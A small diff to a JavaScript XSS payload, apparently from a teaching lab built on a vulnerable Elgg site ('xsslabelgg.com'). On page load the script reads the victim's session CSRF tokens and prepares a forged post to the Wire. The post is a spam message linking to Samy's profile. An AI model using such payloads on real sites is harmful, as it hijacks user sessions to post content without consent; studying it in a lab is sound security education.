@@ -3,7 +3,7 @@ window.onload = function () {
     // var guid = "&guid="+elgg.session.user.guid;
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
-    let link = encodeURI("To earn 12 USD/Hour(!), visit now <a href=\"http://www.xsslabelgg.com/profile/samy\">earn</a>")
+    let link = "To earn 12 USD/Hour(!), visit now http:\/\/www.xsslabelgg.com\/profile\/samy"
     var body = "&body="+link;
     
     var sendurl = "http://www.xsslabelgg.com/action/thewire/add";
